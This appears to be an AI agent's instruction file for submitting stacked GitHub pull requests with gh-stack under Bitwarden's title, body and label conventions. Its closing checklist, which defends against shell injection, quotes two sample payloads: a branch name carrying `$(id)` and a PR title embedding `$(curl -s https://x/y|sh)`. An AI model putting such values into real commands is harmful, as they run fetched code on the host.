# Submitting a Stack With Bitwarden's Conventions

Verified against `gh-stack` v0.1.0, which is the first release containing `gh stack merge`.
It is pre-1.0, so re-check the flag sets below against `gh stack <command> --help` if the
installed version differs.

`gh stack submit` pushes the branches and creates the pull requests, but it accepts only
`--auto`, `--open`, and `--remote`. There is no flag for a title, a body, or a label. With
`--auto` the titles are generated, so they carry no `<type>:` prefix — CI reads that prefix to
apply the `t:` label, and without it every layer ships unlabelled and with an improvised body.

Two paths close that gap. Both end with the same result: N pull requests carrying Bitwarden's
conventions, joined into a stack on GitHub.

## Path A — create each PR, then link them (default)

Create every layer's pull request with the conventions Step 3 already composed — `Skill(applying-pr-conventions)`
produced each layer's title, body, and label. Then join them.

First write each layer's confirmed body to its own file. Use the **Write tool**, not a heredoc
or `echo`: a heredoc that is not quoted still goes through shell parsing, which is the hazard
this step exists to avoid. Put the files in a fresh private directory outside the repository, in three moves. Shell state
does not survive between Bash calls and the Write tool is not a shell command, so a `$BODY_DIR`
set in one call is gone by the time Write runs and gone again in the next:

1. **Bash:** `D="$(mktemp -d)"; echo "$D"` — note the literal path it prints.
2. **Write:** each layer's body to `<that literal path>/pr-body-N.md`.
3. **Bash:** the block below, with the literal path substituted in. Do not reference `$BODY_DIR`.

Fixed `/tmp/pr-body-N.md` paths are not an acceptable shortcut: they are guessable, so on a
shared host the path can be pre-created as a symlink, and two submissions running at once
collide. These bodies carry each layer's deferred CRITICAL and IMPORTANT findings. Remove the
directory once every PR exists.

```bash
# <BODY_DIR> below is the literal path from move 1, not a shell variable.
# Push the whole chain first. This needs an initialized stack — see Step 1.
gh stack push

# One PR per layer, bottom to top, each based on the layer below it.
# Body via --body-file, never --body: the body carries model- and template-derived text,
# and interpolating it into a double-quoted shell argument would let backticks or $(…) run.
# <stack base> is the branch layer 1 was cut from — trunk, or rc/hotfix-rc/a release branch.
gh pr create --draft --base "<stack base>" --head "<layer-1>" --title "[PM-XXXXX] feat: …"     --body-file "<BODY_DIR>/pr-body-1.md" --label "ai-review"
gh pr create --draft --base "<layer-1>"    --head "<layer-2>" --title "[PM-XXXXX] refactor: …" --body-file "<BODY_DIR>/pr-body-2.md" --label "ai-review"

# Join them into a stack on GitHub, in stack order, bottom to top.
# --base is required, not optional: without it `gh stack link` falls back to the repository
# default branch and rewrites the bottom PR's base to match, silently retargeting a stack
# rooted on rc, hotfix-rc, or a release branch after the user already confirmed the preview.
gh stack link --base "<stack base>" "<pr-1>" "<pr-2>"
```

Delete `<BODY_DIR>` only once every layer has a pull request — `rm -rf "<BODY_DIR>"` as its own step, after you have confirmed that. On a partial failure the recovery below re-runs `gh pr create` for the layers that did not land, and those still need their body files; the bodies carry each layer's deferred CRITICAL and IMPORTANT findings.

`gh stack link` takes branch names, PR numbers, or PR URLs in stack order and reuses any
open PR a branch already has, so nothing is duplicated. To append to a stack that already
exists, pass the stack number first: `gh stack link <stack-number> <new-pr>`.

Prefer this path. Every PR is correct the moment it exists, and the conventions come from one
place instead of being reapplied afterwards.

## Path B — submit, then correct

Write the body files first, exactly as in Path A.

```bash
gh stack submit --auto
gh pr edit <pr-1> --title "[PM-XXXXX] feat: …" --body-file "<BODY_DIR>/pr-body-1.md" --add-label "ai-review"
gh pr edit <pr-2> --title "[PM-XXXXX] refactor: …" --body-file "<BODY_DIR>/pr-body-2.md" --add-label "ai-review"
```

Same rule for the cleanup: `rm -rf "<BODY_DIR>"` runs as its own step once every `gh pr edit` has succeeded, never chained after them.

Fewer moving parts, and `--auto` creates drafts unless `--open` is passed. The cost is a
window where the pull requests exist with generated titles and no labels. Anything watching
the repository — reviewers, notifications, label-driven automation — sees them in that state,
and a `gh pr edit` that fails partway leaves the stack inconsistent.

Use this path only when Path A is blocked, and verify every layer's title and labels
afterwards rather than assuming the edits landed.

## Either way

- Create as **draft** unless the user explicitly asked for ready-for-review.
- Use the label the user chose for the stack on every layer, and omit `--label` entirely when
  they chose "No label". The `ai-review` shown above is an example, not a default.
- Repeat the Jira ticket key on every layer; choose the type keyword per layer.
- After submitting, post the full list of PR URLs in stack order, bottom to top.
- `gh stack submit` and `gh stack link` update an existing stack rather than duplicating it. On
  Path A, `gh pr create` instead errors when the head branch already has an open PR, so recover
  by re-running only the layers whose `gh pr create` had not landed.
- Branch names reach the shell too, and a branch name is legal git syntax while still being a
  shell payload: `main$(id)` is a valid branch name and `git check-ref-format --branch` accepts
  it. Validate every branch name against `^[A-Za-z0-9_][A-Za-z0-9._/-]*$` before composing a command, and
  quote it in the command as shown above. Refuse to submit a layer whose branch name fails.
- `gh` has no `--title-file`, so a title does go through the shell inside a double-quoted
  argument. **Validate the whole composed title against an allowlist and refuse anything that
  does not match:**

  ```
  ^\[PM-[0-9]{1,7}\] (feat|fix|chore|docs|refactor|test|ci|build|perf|revert|deps|llm|breaking|misc)(\([a-z0-9._/-]+\))?: [A-Za-z0-9 ,.:'()/_-]+$
  ```

  The summary has to be covered too, not just the prefix: it is the model- and template-derived
  part, so `[PM-31007] feat: handle $(curl -s https://x/y|sh) tokens` satisfies a shape check
  that only pins the prefix and then executes when interpolated. Rejecting `$`, backticks,
  backslashes, and `"` stays as a second pass, but it is a denylist and it only holds for the
  double-quoted style above — a single-quoted composition reopens it via `'`. This applies to
  single-branch PRs too.
